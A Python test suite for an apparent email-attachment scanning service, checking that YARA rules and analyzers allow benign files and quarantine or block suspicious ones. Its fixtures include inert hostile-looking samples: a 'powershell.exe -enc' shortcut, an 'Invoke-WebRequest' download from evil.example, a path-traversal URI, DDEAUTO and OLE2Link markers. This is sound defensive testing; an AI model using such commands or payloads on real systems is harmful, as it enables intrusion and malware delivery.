from __future__ import annotations

import base64
import io
import asyncio
import json
import shutil
import tempfile
import time
import zipfile
from io import BytesIO
from pathlib import Path

from fastapi.testclient import TestClient
from pypdf import PdfWriter

from app.api import create_app
from app.config import Settings
from app.models import JobRecord, JobStatus
from app.rules import CompiledRuleset, RuleService, build_filepaths
from app.service import AnalysisService


def build_client() -> TestClient:
    temp_dir = tempfile.TemporaryDirectory()
    rules_root = Path(temp_dir.name) / "rules"
    shutil.copytree(Path("rules"), rules_root)
    settings = Settings(
        database_url=f"sqlite+aiosqlite:///{Path(temp_dir.name) / 'sandbox.db'}",
        object_store_root=str(Path(temp_dir.name) / "objects"),
        rules_root=str(rules_root),
        compiled_rules_path=str(Path(temp_dir.name) / "compiled" / "default_rules.yarc"),
        embedded_worker=True,
        queue_backend="memory",
    )
    client = TestClient(create_app(AnalysisService(settings)))
    client._temp_dir = temp_dir  # type: ignore[attr-defined]
    return client


def wait_for_completion(client: TestClient, job_id: str, timeout: float = 3.0) -> dict:
    deadline = time.time() + timeout
    while time.time() < deadline:
        response = client.get(f"/analysis/jobs/{job_id}")
        payload = response.json()
        if payload["status"] == "completed":
            return payload
        time.sleep(0.02)
    raise AssertionError(f"job {job_id} did not complete in time")


def build_zip(entries: dict[str, bytes]) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        for name, content in entries.items():
            archive.writestr(name, content)
    return buffer.getvalue()


def build_pdf_with_javascript() -> bytes:
    buffer = BytesIO()
    writer = PdfWriter()
    writer.add_blank_page(width=72, height=72)
    writer.add_js("app.alert('x')")
    writer.write(buffer)
    return buffer.getvalue()


def build_encrypted_pdf() -> bytes:
    buffer = BytesIO()
    writer = PdfWriter()
    writer.add_blank_page(width=72, height=72)
    writer.encrypt("secret")
    writer.write(buffer)
    return buffer.getvalue()


def build_pdf_with_uri(uri: str) -> bytes:
    buffer = BytesIO()
    writer = PdfWriter()
    writer.add_blank_page(width=200, height=200)
    writer.add_uri(0, uri, [10, 10, 120, 30])
    writer.write(buffer)
    return buffer.getvalue()


def build_office_ooxml(entries: dict[str, bytes]) -> bytes:
    base_entries = {
        "[Content_Types].xml": b"""<?xml version="1.0" encoding="UTF-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>
""",
        "word/document.xml": b"""<?xml version="1.0" encoding="UTF-8"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>hello</w:t></w:r></w:p></w:body></w:document>
""",
    }
    base_entries.update(entries)
    return build_zip(base_entries)


def build_rtf_ole2link() -> bytes:
    return (
        b"{\\rtf1\\ansi\\ansicpg1252\\fromtext "
        b"\\objdata "
        b"4f4c45324c696e6b "
        b"d0cf11e0a1b11ae1 "
        b"68007400740070003a002f002f00}"
    )


def test_allows_benign_pdf() -> None:
    with build_client() as client:
        response = client.post(
            "/analysis/jobs",
            files={"file": ("report.pdf", b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog >>\n", "application/pdf")},
            data={"source_id": "mail-gateway"},
        )
        assert response.status_code == 202

        payload = wait_for_completion(client, response.json()["job_id"])
        assert payload["verdict"] == "allow"
        assert payload["normalized_type"] == "pdf"
        assert payload["reasons"] == []


def test_quarantines_pdf_with_embedded_javascript() -> None:
    with build_client() as client:
        response = client.post(
            "/analysis/jobs",
            files={
                "file": (
                    "invoice.pdf",
                    build_pdf_with_javascript(),
                    "application/pdf",
                )
            },
            data={"source_id": "mail-gateway"},
        )
        payload = wait_for_completion(client, response.json()["job_id"])
        assert payload["verdict"] == "quarantine"
        assert "PDF_EMBEDDED_JS" in payload["reasons"]


def test_quarantines_encrypted_pdf() -> None:
    with build_client() as client:
        response = client.post(
            "/analysis/jobs",
            files={"file": ("protected.pdf", build_encrypted_pdf(), "application/pdf")},
            data={"source_id": "mail-gateway"},
        )
        payload = wait_for_completion(client, response.json()["job_id"])
        assert payload["verdict"] == "quarantine"
        assert "PDF_ENCRYPTED" in payload["reasons"]


def test_allows_pdf_with_benign_https_uri() -> None:
    with build_client() as client:
        response = client.post(
            "/analysis/jobs",
            files={"file": ("linked.pdf", build_pdf_with_uri("https://example.com/report"), "application/pdf")},
            data={"source_id": "mail-gateway"},
        )
        payload = wait_for_completion(client, response.json()["job_id"])
        assert payload["verdict"] == "allow"
        assert "PDF_EMBEDDED_JS" not in payload["reasons"]
        assert "PDF_SUSPICIOUS_URI" not in payload["reasons"]


def test_quarantines_pdf_with_private_ip_uri() -> None:
    with build_client() as client:
        response = client.post(
            "/analysis/jobs",
            files={
                "file": (
                    "internal-link.pdf",
                    build_pdf_with_uri(
                        "http://192.168.223.129:8082/general/weibo/action/download.do.php?attachmentName=../../../../1.txt"
                    ),
                    "application/pdf",
                )
            },
            data={"source_id": "mail-gateway"},
        )
        payload = wait_for_completion(client, response.json()["job_id"])
        assert payload["verdict"] == "quarantine"
        assert "PDF_SUSPICIOUS_URI" in payload["reasons"]


def test_quarantines_macro_enabled_office_attachment() -> None:
    office_bytes = build_office_ooxml({"word/vbaProject.bin": b"fake-macro"})
    with build_client() as client:
        response = client.post(
            "/analysis/jobs",
            files={
                "file": (
                    "invoice.docm",
                    office_bytes,
                    "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                )
            },
            data={"source_id": "mail-gateway"},
        )
        payload = wait_for_completion(client, response.json()["job_id"])
        assert payload["verdict"] == "quarantine"
        assert "OFFICE_VBA_MACRO" in payload["reasons"]


def test_blocks_office_attachment_with_dde() -> None:
    office_bytes = build_office_ooxml(
        {
            "word/document.xml": b"""<?xml version="1.0" encoding="UTF-8"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>DDEAUTO</w:t></w:r></w:p></w:body></w:document>
""",
        }
    )
    with build_client() as client:
        response = client.post(
            "/analysis/jobs",
            files={
                "file": (
                    "dde.docx",
                    office_bytes,
                    "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                )
            },
            data={"source_id": "mail-gateway"},
        )
        payload = wait_for_completion(client, response.json()["job_id"])
        assert payload["verdict"] == "block"
        assert "OFFICE_DDE" in payload["reasons"]


def test_quarantines_unknown_binary() -> None:
    with build_client() as client:
        response = client.post(
            "/analysis/jobs",
            files={"file": ("blob.bin", b"\x00\x01\x02\x03" * 512, "application/octet-stream")},
            data={"source_id": "mail-gateway"},
        )
        payload = wait_for_completion(client, response.json()["job_id"])
        assert payload["verdict"] == "quarantine"
        assert "UNKNOWN_COMPOUND_FILE" in payload["reasons"]


def test_blocks_archive_with_dangerous_combination() -> None:
    archive_bytes = build_zip(
        {
            "invoice.pdf.lnk": b"L\x00\x00\x00\x01\x14\x02\x00powershell.exe -enc AAAA",
            "readme.txt": b"please review",
        }
    )
    with build_client() as client:
        response = client.post(
            "/analysis/jobs",
            files={"file": ("bundle.zip", archive_bytes, "application/zip")},
            data={"source_id": "mail-gateway"},
        )
        payload = wait_for_completion(client, response.json()["job_id"])
        assert payload["verdict"] == "block"
        assert "ARCHIVE_DANGEROUS_COMBINATION" in payload["reasons"]
        assert any(artifact["kind"] == "archive_entry" for artifact in payload["artifacts"])


def test_blocks_rtf_attachment_with_external_maldoc_signature() -> None:
    with build_client() as client:
        response = client.post(
            "/analysis/jobs",
            files={"file": ("invoice.rtf", build_rtf_ole2link(), "application/rtf")},
            data={"source_id": "mail-gateway"},
        )
        payload = wait_for_completion(client, response.json()["job_id"])
        assert payload["verdict"] == "block"
        assert "OFFICE_EXPLOIT_SIGNATURE" in payload["reasons"]


def test_reuses_object_reference_with_cached_result() -> None:
    with build_client() as client:
        content = b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog >>\n"
        first = client.post(
            "/analysis/jobs",
            files={"file": ("report.pdf", content, "application/pdf")},
            data={"source_id": "mail-gateway"},
        )
        first_payload = wait_for_completion(client, first.json()["job_id"])
        sample_sha = first_payload["sample_sha256"]

        second = client.post(
            "/analysis/jobs",
            json={
                "filename": "duplicate.pdf",
                "source_id": "mail-gateway",
                "declared_mime": "application/pdf",
                "object_ref": sample_sha,
                "content_sha256": sample_sha,
            },
        )
        assert second.status_code == 202
        second_payload = client.get(f"/analysis/jobs/{second.json()['job_id']}").json()
        assert second_payload["status"] == "completed"
        assert second_payload["verdict"] == "allow"


def test_accepts_json_inline_payload() -> None:
    with build_client() as client:
        payload = {
            "filename": "script.js",
            "source_id": "mail-gateway",
            "declared_mime": "application/javascript",
            "content_base64": base64.b64encode(b"Invoke-WebRequest https://evil.example/login").decode(),
        }
        response = client.post("/analysis/jobs", json=payload)
        assert response.status_code == 202
        result = wait_for_completion(client, response.json()["job_id"])
        assert result["verdict"] == "block"
        assert "SCRIPT_DOWNLOADER" in result["reasons"]


def test_writes_compiled_yara_bundle() -> None:
    temp_dir = tempfile.TemporaryDirectory()
    settings = Settings(
        database_url=f"sqlite+aiosqlite:///{Path(temp_dir.name) / 'sandbox.db'}",
        object_store_root=str(Path(temp_dir.name) / "objects"),
        compiled_rules_path=str(Path(temp_dir.name) / "compiled" / "default_rules.yarc"),
        embedded_worker=False,
        queue_backend="memory",
    )
    service = AnalysisService(settings)
    with TestClient(create_app(service)):
        compiled_path = Path(settings.compiled_rules_path)
        assert compiled_path.exists()
        assert compiled_path.with_suffix(".json").exists()
    temp_dir.cleanup()


def test_recompiles_yara_bundle_when_rule_sources_change() -> None:
    temp_dir = tempfile.TemporaryDirectory()
    root = Path(temp_dir.name)
    rules_root = root / "rules"
    shutil.copytree(Path("rules"), rules_root)
    compiled_path = root / "compiled" / "default_rules.yarc"

    service = RuleService(rules_root, compiled_path)
    before_hit = service.match(
        content=b"%PDF-1.4\n/JavaScript",
        filename="sample.pdf",
        normalized_type="pdf",
        declared_mime="application/pdf",
    )[0]
    assert before_hit.reason == "PDF_EMBEDDED_JS"

    pdf_rule_path = rules_root / "yara" / "20_pdf.yar"
    updated = pdf_rule_path.read_text(encoding="utf-8").replace("PDF_EMBEDDED_JS", "PDF_JS_RENAMED", 1)
    pdf_rule_path.write_text(updated, encoding="utf-8")

    reloaded = RuleService(rules_root, compiled_path)
    after_hit = reloaded.match(
        content=b"%PDF-1.4\n/JavaScript",
        filename="sample.pdf",
        normalized_type="pdf",
        declared_mime="application/pdf",
    )[0]
    meta = json.loads(compiled_path.with_suffix(".json").read_text(encoding="utf-8"))

    assert after_hit.reason == "PDF_JS_RENAMED"
    assert meta["source_digest"] == reloaded._rules.metadata.source_digest
    temp_dir.cleanup()


def test_build_filepaths_discovers_external_dot_yara_rules() -> None:
    filepaths = build_filepaths(Path("rules/yara"))
    assert "external_reversinglabs_trojan_Win32.Trojan.Emotet" in filepaths


def test_maps_reversinglabs_match_to_known_malware_signature() -> None:
    class FakeMatch:
        def __init__(self) -> None:
            self.meta = {
                "source": "ReversingLabs",
                "category": "MALWARE",
                "malware": "EMOTET",
                "tc_detection_type": "Trojan",
            }
            self.rule = "Win32_Trojan_Emotet"
            self.namespace = "external_reversinglabs_trojan_Win32.Trojan.Emotet"
            self.tags = ["tc_detection", "malicious"]
            self.strings = []

    class FakeCompiledRules:
        def match(self, **_: object) -> list[FakeMatch]:
            return [FakeMatch()]

    with tempfile.TemporaryDirectory() as temp_dir:
        service = RuleService("rules", Path(temp_dir) / "rules.yarc")
        service._rules = CompiledRuleset(metadata=service._rules.metadata, compiled_rules=FakeCompiledRules())
        hits = service.match(
            content=b"MZ\x90\x00dummy",
            filename="payload.exe",
            normalized_type="executable",
            declared_mime="application/octet-stream",
        )

        assert hits[0].reason == "KNOWN_MALWARE_SIGNATURE"
        assert hits[0].score == 100
        assert hits[0].source == "yara-reversinglabs"


def test_serves_demo_page() -> None:
    with build_client() as client:
        response = client.get("/")
        assert response.status_code == 200
        assert "邮件附件" in response.text
        assert "Static Attachment Sandbox" in response.text


def test_job_claim_is_idempotent() -> None:
    temp_dir = tempfile.TemporaryDirectory()
    settings = Settings(
        database_url=f"sqlite+aiosqlite:///{Path(temp_dir.name) / 'sandbox.db'}",
        object_store_root=str(Path(temp_dir.name) / "objects"),
        compiled_rules_path=str(Path(temp_dir.name) / "compiled" / "default_rules.yarc"),
        embedded_worker=False,
        queue_backend="memory",
    )
    service = AnalysisService(settings)

    async def scenario() -> None:
        await service.repository.initialize()
        job = JobRecord(
            sample_sha256="a" * 64,
            filename="test.bin",
            declared_mime="application/octet-stream",
            source_id="test",
            object_ref="a" * 64,
        )
        await service.repository.create_job(job)
        claimed = await service.repository.mark_job_running(job.job_id)
        assert claimed is not None
        assert claimed.status == JobStatus.RUNNING
        claimed_again = await service.repository.mark_job_running(job.job_id)
        assert claimed_again is None
        await service.engine.dispose()

    asyncio.run(scenario())
    temp_dir.cleanup()


def test_blocks_nested_archive_payload() -> None:
    inner_archive = build_zip({"payload.js": b"Invoke-WebRequest https://evil.example/login"})
    outer_archive = build_zip({"nested.zip": inner_archive})
    with build_client() as client:
        response = client.post(
            "/analysis/jobs",
            files={"file": ("outer.zip", outer_archive, "application/zip")},
            data={"source_id": "mail-gateway"},
        )
        payload = wait_for_completion(client, response.json()["job_id"])
        assert payload["verdict"] == "block"
        assert "ARCHIVE_DANGEROUS_COMBINATION" in payload["reasons"]
        assert any(artifact["filename"] == "nested.zip" for artifact in payload["artifacts"])


def test_lists_rules_with_external_and_builtin_entries() -> None:
    with build_client() as client:
        response = client.get("/rules")
        assert response.status_code == 200
        payload = response.json()
        paths = {rule["path"] for rule in payload["rules"]}
        assert "20_pdf.yar" in paths
        assert "external/reversinglabs/trojan/Win32.Trojan.Emotet.yara" in paths


def test_creates_updates_and_deletes_local_rule() -> None:
    initial_rule = """
rule TEST_Local_Attachment_Rule {
    meta:
        reason = "KNOWN_MALWARE_SIGNATURE"
        score = 100
        source = "local-yara"
    strings:
        $a = "ATTACHMENT-TEST-MARKER"
    condition:
        $a
}
""".strip()
    updated_rule = initial_rule.replace("ATTACHMENT-TEST-MARKER", "ATTACHMENT-TEST-MARKER-V2")

    with build_client() as client:
        create_response = client.post(
            "/rules",
            json={"path": "local/test_attachment_rule.yar", "content": initial_rule},
        )
        assert create_response.status_code == 201
        assert create_response.json()["rule"]["path"] == "local/test_attachment_rule.yar"

        rule_response = client.get("/rules/local/test_attachment_rule.yar")
        assert rule_response.status_code == 200
        assert "TEST_Local_Attachment_Rule" in rule_response.json()["rule_names"]

        update_response = client.put(
            "/rules/local/test_attachment_rule.yar",
            json={"path": "local/test_attachment_rule.yar", "content": updated_rule},
        )
        assert update_response.status_code == 200
        assert "ATTACHMENT-TEST-MARKER-V2" in update_response.json()["rule"]["content"]

        hit_response = client.post(
            "/analysis/jobs",
            files={"file": ("payload.txt", b"ATTACHMENT-TEST-MARKER-V2", "text/plain")},
            data={"source_id": "mail-gateway"},
        )
        hit_payload = wait_for_completion(client, hit_response.json()["job_id"])
        assert hit_payload["verdict"] == "block"
        assert "KNOWN_MALWARE_SIGNATURE" in hit_payload["reasons"]

        delete_response = client.delete("/rules/local/test_attachment_rule.yar")
        assert delete_response.status_code == 204

        after_delete = client.get("/rules/local/test_attachment_rule.yar")
        assert after_delete.status_code == 404


def test_rejects_external_rule_modification() -> None:
    with build_client() as client:
        response = client.put(
            "/rules/external/reversinglabs/trojan/Win32.Trojan.Emotet.yara",
            json={"path": "external/reversinglabs/trojan/Win32.Trojan.Emotet.yara", "content": "rule x { condition: true }"},
        )
        assert response.status_code == 403


def test_rejects_invalid_rule_create_and_keeps_rules_unchanged() -> None:
    with build_client() as client:
        before = client.get("/rules").json()["rules"]
        response = client.post(
            "/rules",
            json={"path": "local/bad_rule.yar", "content": "rule BROKEN { condition: }"},
        )
        assert response.status_code == 400
        after = client.get("/rules").json()["rules"]
        assert len(after) == len(before)
        assert client.get("/rules/local/bad_rule.yar").status_code == 404
